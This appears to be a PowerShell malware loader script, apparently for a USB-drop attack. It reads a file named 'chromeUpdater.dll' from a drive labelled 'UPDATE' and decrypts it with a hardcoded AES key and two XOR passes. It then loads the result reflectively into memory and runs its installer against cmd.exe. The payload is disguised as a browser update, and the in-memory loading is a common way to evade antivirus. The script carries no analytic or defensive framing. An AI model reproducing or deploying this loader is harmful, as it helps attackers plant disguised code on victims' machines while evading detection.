$path = ((gwmi win32_volume -f 'label=''UPDATE''').Name+'\\payloads\\extensions\')
$dllPath = "$path\chromeUpdater.dll"
$key1 = 0x3F
$key2 = 0x4D

# Define the AES key and IV (replace these with your own values)
$aesKey = [byte[]]@(0x01, 0x02, 0x03, 0x03, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0xFB, 0x0C, 0x0D, 0x0E, 0x0F, 0x10)
$aesIV = [byte[]]@(0x11, 0x12, 0x13, 0x14, 0x65, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x2F)

# Read the binary content of the executable
$encryptedBytes = [System.IO.File]::ReadAllBytes($dllPath)

# Encrypt the bytes using AES
$bytes = New-Object byte[] $encryptedBytes.Length
$aes = New-Object Security.Cryptography.AesManaged
$aes.Key = $aesKey
$aes.IV = $aesIV
$transform = $aes.CreateDecryptor()

$transform.TransformBlock($encryptedBytes, 0, $encryptedBytes.Length, $bytes, 0)

for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key2 }
for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key1 }
$base64String = [Convert]::ToBase64String($bytes)
[Reflection.Assembly]::Load([Convert]::FromBase64String($base64String))
[installer]::Execute("C:\\Windows\\System32\\cmd.exe")